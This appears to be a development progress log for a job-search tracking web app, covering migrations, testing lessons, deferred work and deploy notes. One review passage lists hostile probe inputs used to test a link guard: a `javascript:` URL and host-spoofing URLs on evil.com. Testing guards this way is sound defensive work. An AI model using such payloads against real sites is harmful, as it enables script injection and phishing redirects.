         box. Type tokens are now a plain `@theme`; colours keep `inline`, which is
         what makes `.dark` work.
      4. **"Wait until nothing is pending" is an unsound test gate**: quiet is true
         both before a write starts and after it ends, so a check landing between a
         blur and its commit passes instantly and reloads into the gap — cancelling
         the write and reporting it as lost persistence. Monotonic counters, never
         phase checks. Same family as row 21.

      **Deferred, stated rather than implied** — and three of these were corrected
      by an adversarial review that found the ORIGINAL rationales wrong:

      (a) AC 15's "Needs review" section is built, exercised and asserted through
      `?demo=review`, and has no production source. The first version of this note
      said an `events` read "would return zero rows forever"; that was false.
      `public.events` already has the right shape and 0010 writes it on every
      gesture — what is missing is a writer emitting `kind='email.needs_review'`
      when the joiner declines to choose (close to a one-liner once anything
      mirrors the capture into Postgres) plus an events read in the data layer.
      Later phase, small, not impossible.

      (b) The persona DEFAULT for type scale/density comes from a cookie nothing
      writes. The original reason given — "no `profiles` read exists" — was not the
      real one: a `/settings` toggle needs no profile read at all, it just sets the
      cookie. The honest reason is scope: P8 shipped the MECHANISM and its tests,
      and the control belongs with the rest of the display prefs in PHASE-PROFILE's
      settings page rather than as a stray switch. Anyone can set `hq_display`
      today; nothing in the UI does.

      (c) plans/README **C6 is not half-resolved, it is deviated from, in two
      directions.** `<html data-type-scale>` is the per-user type mechanism C6
      asks for, but `/jobs` still ALSO carries `typeScale` in saved-view state —
      and worse, `hq_display` carries DENSITY too, which C6 puts per-view. So the
      pipeline's density is per-user (one global cookie) because the pipeline has no
      saved-view store to put it in (`savedViews("pipeline")` is unprovisioned).
      `/jobs` keeps its own per-view density untouched, so nothing regressed — what
      exists is two mechanisms across two surfaces, which is exactly what C6 exists
      to collapse. P9 owns finishing it when the values move to `profiles`.

      One consequence was a live bug rather than a label: once the type tokens
      became overridable, the cookie reached `/jobs` and COMPOUNDED with its
      per-view scale — `colScale` widens the columns for the view's ratio and knew
      nothing about the second one, so 15 of 19 comp cells clipped. The grid now
      opts its subtree out (`data-type-scale-scope="own"`) and states its own font
      size in every branch, with a guard test that sets the cookie AND the view
      scale (the existing one set only the view scale, which is why it could not
      see this).

      **Deploy note, previously undisclosed:** `status_actor` is a REQUIRED Pipeline
      header, so from the moment this merges until self-heal appends the column
      (nightly, 03:23 CT) every Pipeline read and write raises `SchemaAnomaly` —
      loudly, with zero writes, which is the durability contract working. Dispatch
      `selfheal` at deploy rather than waiting for the cron. `docs/RUNBOOK.md`
      carries the procedure.

      **Rows 8, 9 and 10 stay ✅.** PHASE-PIPELINE §7 asked for them to be downgraded
      because nothing exercised the mechanisms behind them. That was true when the
      plan was written and is not now: rows 76, 99 and 113–115 drive `failNextWrite`
      and the conflict path end to end.
- [x] **P10 — the Search Profile** (`docs/plans/PHASE-PROFILE.md`; migration **0012**).
      Discharges AC **1–8**, **18**, **19** and G8/G9. Matrix rows **177–208**.

      Five commits in the plan's own increment order, because increments 1–3 are the
      whole risk and 4–7 are surface over settled logic.

      **The gate is reimplemented in TypeScript and `tests/fixtures/gate-corpus.json`
      is the contract.** The app has to answer "what would this profile let through?"
      inside a page render; the engine is Python on a Lambda schedule with no route
      into a Vercel request, and adding one would put an unbounded external call in
      the request path. 67 cases run by BOTH pytest and Vitest, seeded from
      `test_gates.py` assertion by assertion. Three Python builtins had to be written
      out (`str.strip`, `casefold`, `f"{x:g}"`) with a corpus case per divergence in
      BOTH directions — a port drifts on whichever side nobody wrote a case for.

      **The binding constraint is computed by relaxation, not by counting reasons.**
      Gates short-circuit, so the histogram's top entry is frequently not the thing
      starving the queue. The unit case is built so a histogram gets it wrong: 30
      foreign rows filtered on geo and 6 US rows on comp, where relaxing geo recovers
      nothing because those rows then fail the same floor.

      **G8 is one clause — `triage = ''` — and it is in the SQL as well as the
      client.** That single WHERE gives AC 18 and the dismissed half of AC 19, on the
      server, where a client bug cannot route around it.

      Four things that were true and are worth carrying forward:

      1. **A view model can be lossy in a way only a second consumer reveals.**
         `JobView` had no `taggedAt` and no `country`, and both absences re-gate rows
         WRONG: a posting filtered on geo while still untagged carries no trace of
         whether it has been analysed, and `monitor/geo.py:159` collapses country into
         `market` (a remote posting's market is the literal "Remote"), so reading
         `market` qualifies a Canada-anchored remote role the engine filters. Neither
         mattered until something other than a table read those fields.
      2. **A mutant that survives means the test is in the wrong place, twice.** The
         double-submit e2e asserted the idempotency key and a key-rotating mutant
         passed: with a non-null `expectedUpdatedAt` the version token catches the
         second gesture FIRST, so from a browser the two mechanisms are inseparable.
         The claim moved to the db test. Separately the fake's unchanged-tuple check
         survived removal, because a plan BUILT by `buildRegatePlan` never contains
         such an entry — and the plan the server gets is not always freshly built.
      3. **Looking at a recorded baseline found a copy bug no assertion could.** The
         panel told somebody who had not filled in the titles field that "the engine
         has not been sweeping for this kind of role yet". Two states with opposite
         remedies — one fixed by typing, one by waiting — collapsed into one boolean.
         `titleCoverage()` is three-way now, asserted in both suites.
      4. **The draft-in-the-URL took two attempts and the second was worse.** Writing
         it only on Next leaves a value typed ON a step out of that step's entry; a
         debounced `router.replace` then broke it again, because the debounce's
         cleanup fires when the step changes, so pressing Next within 250ms of typing
         CANCELLED the write to the entry being left behind. `history.replaceState`
         is synchronous and cannot be cancelled by the navigation it races.

      **Deferred, stated rather than implied:**

      (a) The G8 review banner links to `/jobs?set=queue`, not `/jobs?keys=…` as the
      plan asks. The grid has no key filter, and adding one changes the URL grammar
      `url-state.test.ts` round-trips over. The plan sanctions the interim ("until
      then the banner links to a filtered queue"); what is NOT done is pre-selecting
      the rows, and the code says so where the link is.

      (b) The queue's own empty state still names its binding constraint by
      HISTOGRAM (`bindingConstraint()`), which is right about the link and can be
      wrong about the advice for row 183's reason. Matrix row 208, open.

      (c) `notify` is carried opaquely and never edited here. The digest phase owns
      that column; `app_commit_profile` preserves it when a commit does not send one,
      asserted in the db suite, so a profile save cannot silently reset somebody's
      notification channel.

      (d) The onboarding guard is a layout redirect, not middleware. Middleware has
      the pathname and runs on every request including the RSC payloads one
      navigation fans out into; the layout runs once per page render beside reads the
      page was making anyway. The cost of giving up the pathname is that
      `/onboarding` has to live OUTSIDE the group — which is also what makes the
      redirect loop structurally impossible rather than avoided by a path check.

      **P10 fix pass** (matrix rows **209–227**). An adversarial review ran 73
      mutants against the branch and 13 findings survived refutation. The signed-off
      half is worth recording too: the `app_preview_corpus` widening itself, the
      gate port's 12 semantic mutants, `pyStrip` over the whole codespace, and the
      wizard's loop-impossibility all held.

      Three shapes came out of it that are not specific to this phase:

      1. **Removing a lie can leave an unanswerable state, and that is progress
         only if something then asks.** `parseCriteria` filling an empty
         `role_family` in from the committed baseline was the bug; deleting the
         fallback made the empty profile reachable, so the wizard gates on it and
         says why. The fix is two changes, not one, and shipping only the first
         would have traded a silent wrong answer for a silent broken one.
      2. **A fake can model the RESULT instead of the MAPPING.** `isOnboarded`'s
         `return true` survived 383 tests because `FixtureDataSource` answered the
         view model it was handed. Every collection a fake owns comes from its
         constructor (row 15) — and every TRANSFORM a real source performs has to
         be performed by the fake too, or the transform is untested by
         construction.
      3. **A guard that greps for its own phrase is not a guard.** The
         `auth.uid()` belt was pinned by a text search, so a tautology passed.
         Same family as rows 92/130/163/165, arriving in SQL.

      **Deploy note:** nothing in the sheet changes, so unlike P8 there is no
      self-heal dispatch to remember. What DOES change is that a user whose
      `profiles.criteria` is `'{}'` is redirected to `/onboarding/1` — which is every
      user, because no row is created at signup and nothing has written one before
      now. That is the intended first-run behaviour, and the wizard's Save is what
      creates the row.
- [x] **Referral finder, steps 1–2** (`docs/plans/REFERRAL-FINDER.md` "Build shape";
      migration **0013**, and **0014 is reserved for auto-apply** — the two numbers were
      assigned up front so the branches cannot collide the way P8's did). Matrix rows
      **228–236**. Seven commits, narrow.

      **The architecture is the risk ladder, not a phase order.** Connection degree
      exists only inside the owner's own logged-in LinkedIn view plus their officially
      exportable CSV; no compliant API sells it; enforcement is suspension-first (hiQ
      ended with the ToS held enforceable, Proxycurl chose shutdown over the fight,
      HeyReach and its USERS' accounts were banned). The account these links open is the
      delivery channel for the whole referral play, so layer ∞ — their `li_at` cookie, a
      page-reading extension, messaging-as-them — stays permanently unbuilt. **Nothing
      in this branch performs a network call to linkedin.com.** Every URL is an `<a
      href>` a person clicks in their own session, and the popover says so on screen.

      What shipped:

      * `companies.linkedin_company_id` on the SHARED table with the shared row's own
        `updated_at` token, backfilled lazily by a paste-once prompt on the row where
        somebody notices the gap.
      * `lib/referral/linkedin.ts` — the pure people-search builder: company, keywords,
        connection degree, school and past-company facets.
      * `public.connections` + the map → preview → commit import at `/connections`,
        reusing `lib/import/read.ts` and a newly-extracted `lib/import/suggest.ts`.
      * The Warm cell on `/jobs` (third column) and `/pipeline`, with the 1st-degree
        match by `company_name_key` and a popover listing the names.

      Two shapes worth carrying out of it:

      1. **A regexp proves a shape and not a value.** The date guard read as thorough
         and accepted `2026-13-45`; the cast behind it then aborted a 1,000-row chunk.
         The check has to be the CONVERSION, in a place a failure can be caught.
      2. **A screenshot found what no assertion could.** The Warm column rendered past
         the scroll container's right edge — invisible on the default desktop view,
         with every functional test green because a testid locator does not care
         whether an element is on screen. Rows 22–24, a fourth time.

      **Deferred, stated rather than implied:**

      (a) **No outreach tracking.** No contact entity, no `identified → contacted →
      replied → referred`, no drafts. That is step 3 of the build shape and it is not
      built, so no string on any surface implies it (matrix row 227's rule applied to
      copy).

      (b) **The school and ex-employer facets are built, tested, and supplied by no
      surface.** The brief's "UIUC there" and "ex-Capital One there" links each need a
      numeric LinkedIn id PER USER, and there is nowhere to keep one: `profiles.criteria`
      is the gate contract (pinned field-by-field to `monitor/gates.py`'s dataclass in
      both directions) and `profiles.notify` belongs to the digest phase. Wiring is one
      profile field and one settings input; until then no copy mentions alumni, so
      nothing on screen promises what is not there.

      (c) **The connections import is not resumable**, unlike P9's. The rows come back
      to the browser instead of staging into Postgres, because a connections export has
      no per-row decisions in it — closing the tab costs a five-second re-upload. Said
      on the mapping screen, not only here.

      (d) **Warm is not sortable**, which the brief asks for ("so 'which of today's
      queue has a warm path' is a sort, not a hunt"). `lib/grid/sort.ts` sorts a
      `JobView[]` before react-table sees it and warmth is not on a `JobView`; a header
      that looked sortable and was not would be worse than a plain one.

      (e) **A promotion collision is skipped rather than merged.** If a URL-less row and
      a row already holding that exact URL both exist, the URL-less one is left alone —
      a genuine duplicate the person clears with "Remove all" and re-imports. Stated on
      the `not exists` that produces it.

      (f) **Two name-keying limits, inherent and unfixed** (matrix rows 243, 244): a
      company whose name carries U+0130 is a silent non-match, and two different
      companies sharing one normalized key collapse to one entry. Both are stated at the
      code that produces them and pinned by tests that assert the real behaviour rather
      than the comfortable one.

      **Adversarial review pass** (matrix rows **237–246**). The risk ladder came back
      CLEAN — the reviewer grepped every added line for `fetch`/`axios`/`XMLHttpRequest`/
      `<img`/`sendBeacon`/`WebSocket`/resource hints and found exactly one hit, the
      same-origin upload, and probed `connectionUrl`'s href guard with
      `javascript:alert(1)//linkedin.com/`, `https://www.linkedin.com.evil.com/`,
      `https://user:pw@evil.com/linkedin.com/` and `https://www.linkedin.com@evil.com/`,
      all of which fall back to a name search. Ten findings, all fixed, two of them HIGH.

      Four shapes out of it that are not specific to this phase:

      1. **A fake can be DIFFERENT rather than merely more forgiving.** The house rule
         is "a fake that is kinder hides the bug it exists to catch". The sharper version:
         the fake answered a different four-number report than production for the one
         scenario the code under it was written for, and the report is what a person
         reads. Behaviour parity has to be pinned by NUMBERS, not only by the presence of
         the clauses that produce them.
      2. **A version token is only a version token if it moves on content.** A trigger
         that fires on every UPDATE turns it into an activity timestamp the moment
         anything bulk-upserts the table, and the failure surfaces as the app accusing
         the user of an edit nobody made.
      3. **Writing the rationale is not what makes code live.** `TableMeta.warm` had
         twelve lines explaining a mechanism nothing read — row 227 reintroduced by the
         branch that cites it three times. A long comment is weak evidence of a caller.
      4. **A gate's silence about what it does not cover reads as coverage.** The perf
         budget excluded the newest per-row component by construction, and nothing said
         so; the fix was a sentence and a stated trigger, not a new harness.
- [x] **Auto-apply, steps 1–2** (`docs/plans/AUTO-APPLY.md` "Build shape"; migration
      **0014**). Two units: the foundations (#82 — the answer library, its policy rules,
      and the pure prepare engine) and the wiring (this branch — the DataSource methods,
      `/settings/answers`, and Prepare/Review at `/apply/[applicationId]`). Matrix rows
      **247–262**.

      `webapp/lib/apply/index.ts` is the contract between the two, and it is worth
      reading before touching either: it names the two reads, the three RPCs, the four
      things the UI may not do, and — the half most likely to be skipped — what is
      DELIBERATELY absent, so the next session does not go looking for it.

      What the wiring turned into surfaces:

      * **`/settings/answers`** — the situation (16 typed policy topics, knockouts
        first and the rest behind a disclosure), the answer library, and per-company
        exceptions. Every control asks about the PERSON, never about the answer to
        submit, because one topic covers questions of opposite polarity.
      * **`/apply/[applicationId]`** — resolve the board, fetch the keyless
        `?questions=true` schema, parse, prepare, render. Gaps first and rendered as
        questions; the polarity beside every rule-sourced value; a typed answer written
        to the library as the person's own, and the field then re-resolved by the ENGINE
        rather than patched on screen.
      * **`lib/apply/board-source.ts`** — the app's second injectable boundary (one
        interface, live and fixture), kept out of `DataSource` because an RLS-scoped
        read and an unauthenticated GET to somebody else's API fail differently.

      **The honest scope line, and it is the whole point of the unit:** no real
      Greenhouse posting reaches `ready`. Every one of them asks for a résumé,
      `attachment` is a blocking gap on a required field, and Prepare does not attach.
      The surface says that in as many words on every blocked card rather than excusing
      the file from the count, and the one demo board that CAN reach `ready` asks for no
      file — it exists so the green card is exercised, and it is not evidence about a
      real application. `batchApprovable` is rendered as an opinion with "not permission
      to send it" in the same sentence.

      **Deferred, stated rather than implied:**

      (a) **No submit, and no path to one.** Step 3 needs a browser, a residential
      egress and the owner decision `AUTO-APPLY.md` records as pending. Nothing on any
      surface implies otherwise, and the `ready` banner says the approve-and-go step is
      not built.

      (b) **No drafting.** A textarea stages as a `free-response` gap with a box to
      paste into. Layer 4 is a later unit with a model in it.

      (c) **Layer 3 has no implementation.** `prepareApplication` takes an optional
      `infer` hook and this surface passes none, so inference is unreachable today —
      correct per the contract, and the reason `needsReview` is currently only ever
      driven by a `suggested` provenance.

      (d) **Prepare reads one row at a time.** The plan's shape is "select rows in the
      grid → hit Apply"; the entry point is a per-row link on `/pipeline`, because a
      batch of staged applications needs a queue surface and a place to keep them, and
      neither exists. The link is on every row rather than only the readable ones: which
      rows those are is a fact about the ATS family and the board link, and a link that
      appears and disappears teaches somebody the feature is flaky.

      (e) **The posting's country costs a full postings read, and so does the row
      itself.** `/apply` reads `jobs()` to find one row's country AND `applications()` to
      find the one row it is about — both full reads for one row each, both bounded the
      way `/jobs` and `/pipeline` already are. A targeted read is worth adding the day
      this page is opened in a loop; naming only the first one was the same silence about
      coverage that rows 101 and 246 are about.

      (f) ~~**An answer can be overwritten and not deleted.**~~ **Closed by the fix
      pass** (0017's `app_delete_answer`). It stopped being an acceptable deferral the
      moment a decline became storable: the only exit from a recorded "I don't wish to
      answer" was to overwrite it with an answer somebody had chosen not to give.
- [x] **Sunset C2 — the capture endpoint** (`docs/plans/SHEET-SUNSET.md` §2 phase C;
      migration **0018**). Gmail events reach Postgres over HTTP instead of only a
      sheet tab. Matrix rows **271–284**.

      `POST /api/capture` takes the Apps Script's batch — the natural serialization
      of the row it already builds, `{"events": [ … ]}`, keys exactly
      `HEADERS["email_events"]` minus the joiner's two — authenticates a per-user
      bearer token stored as a SHA-256, and answers per-event
      `inserted | duplicate | rejected` inside a 200.

      Four things worth carrying forward:

      1. **The one component with no gates now has one.** `Code.gs` is pasted into
         script.google.com — no build, no typecheck, no runtime. Its row shape is
         parsed and compared against the other three copies by
         `tests/core/test_capture_contract.py`, which also reads the ORDERING out of
         the source (sheet append before POST) and the fact that the store lane
         cannot throw, because there is no way to observe either by running it.
      2. **Dual-write means the failure modes are cheap, and that shaped every
         choice.** The endpoint may reject unknown fields, the retry queue may drop
         oldest, a rotation may 401 for a few minutes — all of it is survivable
         because the sheet append happened first and `tracker/join.py` reads the tab.
         None of it stays survivable after phase D, which is why each one is written
         down rather than absorbed.
      3. **The service-role exception is bounded by a test, not by a sentence.** This
         app held only the anon key; the header of `lib/supabase/server.ts` said so.
         `service-key-containment.test.ts` is what keeps that true of everything
         except the one module that needs it.
      4. **`hq_capture_email_events` is a loop with a per-row exception block**, and
         the round trips it costs buy the property the whole endpoint is for: one row
         an LLM classifier got wrong does not take the batch with it.

      **Not in this unit, deliberately:** the digest email (PHASE-DIGEST increments
      3–6) — this is capture only. And **nothing reads `public.email_events` yet**:
      the joiner still reads the tab, and the pg join lane is where 0015's
      `hq_apply_email_event` finally gets its second caller.

- [x] **E5 — display preferences move to `profiles`** (design doc 07 §4; migration
      **0025**). The **first** of the redesign's prerequisite spine, and the one the
      cutover order puts first because it proves the pipeline end to end on the
      richest existing surface.

      **What it closes: half of conflict C6, precisely.** The deferral note above
      (item **c**) records two mechanisms across two surfaces. The per-USER half is
      now one store: density, type scale, keyboard hints, landing view and theme are
      typed columns on `profiles` with CHECK constraints and server-owned defaults,
      the `hq_display` cookie is gone, and `app/layout.tsx` renders
      `data-type-scale` / `data-density` on `<html>` from the profile — on the
      server, so the attributes are in the first byte of the document rather than in
      the first script that runs against it. Item **b** ("the persona default comes
      from a cookie nothing writes") is discharged: `/settings` writes the profile.

      **What it does NOT close, stated so nobody reads this as done:** `/jobs` still
      carries `typeScale` / `density` / `hints` in `saved_views.state`, and the
      `data-type-scale-scope="own"` block in `globals.css` is still load-bearing.
      That half retires with the **Display popover**, which lands with the Jobs
      surface build from the owner's design (07 §3). Deleting the scope block before
      then re-opens the compounding that clipped 15 of 19 comp cells.

      **The bug worth the migration on its own.** `updated_at` is the Search
      Profile's optimistic-concurrency token and 0001's `profiles_touch` bumped it on
      every update to the row — while Preferences AUTOSAVE (06 §A). So "tick Larger
      text, then press Save changes" would have raised `conflict: this profile
      changed since you read it` over a gesture that touched nothing the form edits,
      every time, on the one page carrying both controls. 0025 gives the display lane
      its own `display_updated_at` and makes `profiles_touch` conditional — written
      as *"the display tuple did not change"*, never as *"a non-display column did"*,
      so every existing writer keeps its exact behaviour including a save that
      rewrites `criteria` to the same value.

      **Autosave semantics, in the write path rather than in the UI.** Every value
      parameter of `app_set_display_prefs` is nullable and null means "leave it", so
      two devices turning two different knobs cannot revert each other; a write that
      changes nothing writes nothing — no token bump, no event — so an autosave storm
      of identical values cannot invalidate a tab's own version token or fill the
      append-only trail.

      **Three deviations, each a decision rather than an oversight.** (1) The
      vocabulary is the repo's `dense|comfortable` / `default|large`, not 01 §3's
      "compact"/"normal": `globals.css` matches `:root[data-density="comfortable"]`
      and four e2e specs assert those attribute values, so the brief's words would
      need a translation layer between the column and the CSS selector. (2) `theme`
      defaults to `system`, not the design's "light default" — a stored `light` would
      silently overrule the OS for every existing account, and `theme.spec.ts` pins
      the opposite on five routes. **Owner call.** (3) Theme keeps its `localStorage`
      lane, because `system` means "ask the operating system" and a server cannot;
      the profile is the server-rendered default underneath it.

      Notification preferences are NOT duplicated: `profiles.notify` has held them
      since 0001 and `app_commit_profile` already carries it opaquely.

      **`tests/unit/theme-split.test.ts` is new and is the point of 07 §2.** Type
      tokens must stay in a plain `@theme` and colours in `@theme inline`; swap them
      and nothing errors — Tailwind compiles either way, the token tests add `.dark`
      by hand, and both runtime proofs live on surfaces that will be replaced. The
      pin is structural so it survives a rewrite of every component.

      Gates: 21 db cases (three mutations watched red), 1721 vitest, 910 playwright
      across both projects, container visual **53/53 with zero re-records** — the
      defaults are byte-identical to what the app rendered before.

      **Adversarial review before the PR, and what it found.** The gates above were
      claimed, not verified; re-run, `tsc` and vitest and the 642-case db suite
      against a real Postgres are green, and two of the three claimed mutations were
      re-watched red (the trigger's `when` clause, and `keyboardHints !== false`).
      Two defects came out of it and are fixed here, one is recorded and is an
      **owner call**:

      1. *Fixed.* The autosave control called `setDisplayPrefsAction` with **no
         timeout and no catch** — the only client write in the app without both
         (`WRITE_TIMEOUT_MS = 15_000` is declared in five other files for matrix row
         135's reason). A server action REJECTS when the network is gone, so offline
         left `pending` set, the checkbox disabled forever, and nothing on screen
         saying why. Autosave makes that worse than anywhere else: there is no Save
         button to press again. Now bounded, caught, and carrying one idempotency key
         per gesture held across retries so "try again" cannot write twice.
         `tests/unit/display-prefs-control.test.tsx` fails on all three against the
         previous file.
      2. *Fixed.* The rebase onto `0020_warm_referral.sql` turned both migration
         numbering assertions red, exactly as `RESERVED_MIGRATION_NUMBERS` promises.
         The `20:` line is deleted.
      3. **Open, owner call — the root layout is now dynamic on every route.**
         `shellDisplayPrefs()` reads cookies in `app/layout.tsx`, so with Supabase
         env present `next build` moves `/`, `/login`, `/setup` and `/_not-found`
         from **○ Static** to **ƒ Dynamic** (verified both ways against `origin/main`
         with the same env). Signed-out pages now cost a request-time resolve. That
         is inherent to per-user attributes on `<html>` rather than a mistake in the
         implementation — a nested layout cannot set them and a wrapper `div` would
         leave every portal outside the chosen scale — so it is stated rather than
         silently re-architected here.

      Two smaller notes, neither fixed: `theme` still gives `localStorage`
      precedence over the profile, so a browser that has already chosen a palette
      will not follow a theme set from another device until the Display popover
      writes both halves; and the server action accepts any bounded
      `landingView` string while `parseDisplayPrefs` resolves anything outside
      `KNOWN_LANDING_VIEWS` back to `""`, so such a value stores and reads back
      empty. No surface writes either field yet.

- [ ] **Next up — the rest of Track 2** (`docs/plans/HQ-V2-BUILD.md`): P11 digest.
      Track-1 discovery infra is complete **except the last hop**: 0009 landed the
      reconciler and `monitor/universe.py`, which READS the verdict —
      `review_state='approved' AND monitor` (there is no `enabled` column; `monitor` is
      that flag) — and the discovery agent honors dismissals. What still does not
      happen is `monitor/run.py` consuming it: the sweep takes its company list from the
      sheet's Companies tab, and `swept_companies` is written, shape-compatible and
      uncalled. That last hop is an owner decision, not a build item — which store is
      authoritative for which user (`docs/plans/COMPANY-DISCOVERY.md` → *"Open fork: the
      sheet↔pg company bridge"*).

## Stack (verified live 2026-07-21, not from memory)

| Package | Version | Why |
|---|---|---|
| tailwindcss + @tailwindcss/postcss | 4.3.3 | CSS-first `@theme`; no tailwind.config.ts |
| radix-ui (unified) | 1.6.4 | accessibility + focus management we must not hand-roll |
| sonner | 2.0.7 | toasts with a first-class undo action |
| @tanstack/react-table | 8.21.3 | v9 is beta-only; v8 is the stable grid |
| @tanstack/react-virtual | 3.14.7 | row virtualization for the grid phase |
| write-excel-file | 4.1.1 | **not `xlsx`** — npm's SheetJS is frozen at 0.18.5 (2022) with CVE-2023-30533 |
| vitest 4.1.10 / playwright 1.61.1 | | unit + E2E |

**Landmines already avoided:** `shadcn init` now defaults to Base UI (an RC) —
must pass `--base radix`; Vite 8 needs Node ≥ 20.19 (engines bumped);
`tailwind-merge` must be 3.x for Tailwind v4; jsdom has no layout engine, so
anything virtualized is tested in Playwright, never Vitest.

## Design decisions worth not re-litigating

1. **The queue owns its working set.** `revalidatePath("/queue")` after each
   decision was removed: refetching mid-session reorders cards under the
   user's cursor and fights the optimistic update. Only `/pipeline` is
   revalidated. The queue re-reads on next visit, which is when a fresh list
   is actually wanted.
2. **Demo stores are keyed by cookie.** One shared store meant parallel tests
   drained each other's queues; per-session also matches how the real app
   behaves.
3. **CI uses `npm install`, not `npm ci`.** Tailwind v4's native oxide binary
   resolves a different platform-optional tree on linux-x64 than darwin-arm64,
   and npm cannot record both cleanly in one lockfile (esbuild, rollup and
   sharp all share this friction). `npm ci` failed on a lockfile that was
   otherwise correct. Versions remain pinned; only the strict in-sync
   assertion is given up, and here it only ever fired as a false alarm.
4. **Visual snapshots are platform-specific.** macOS baselines are guaranteed
   to fail on Linux CI, so they are opt-in (`PLAYWRIGHT_VISUAL=1`) until
   baselines are recorded on a runner. A permanently-red check teaches people
   to ignore checks.
5. **Export files are built on the server, from row keys the client names.**
   The browser never posts the rows themselves. An export therefore passes
   through exactly the row-level security the screen does — a client that sent
   its own payload could export anything it could fabricate, and the file would
   look identical. It also keeps a zip writer out of the bundle of someone who
   only wanted to triage.
6. **The dialog reads its counts when it opens.** Passing them down from the
   page is one fewer request and one guaranteed lie: the number goes stale the
   moment a card is triaged. The number stated must be the number in the file.
7. **An undeliverable decision is kept, not reverted.** Offline and expired
   sessions are deferrals, not rejections — the decision was valid, it just
   could not be sent. Reverting makes the user re-triage a card that has
   already left the screen. Conflicts and genuine server rejections still
   revert, because those *are* answers. Replay is safe because every gesture
   already carries an idempotency key; that property is what makes "retry until
   it works" correct rather than a duplicate-write hazard.

## How to work on it

```sh
cd webapp
npm install
npm run dev            # http://localhost:3000
HQ_DEMO=1 npm run dev  # with fixture data, no Supabase needed
npm run typecheck
npm run test           # vitest (unit)
npm run test:e2e       # playwright (journeys, overflow, visual)
```

Python side is unchanged and must stay green:
`uv run --python 3.11 --with-requirements requirements.txt --no-project -- pytest`

## Rules that already cost a production incident

1. Every external call gets a **bound** (timeout). Three outages in one day
   traced to unbounded waits inside jobs with hard timeouts.
2. **One job per external dependency.** Two vendors in one workflow meant one
   vendor's stall was the other's outage.
3. A fake that is more forgiving than the real API hides the bug it exists to
   catch.
4. Workflows are code: `tests/core/test_workflows.py` parses them all.
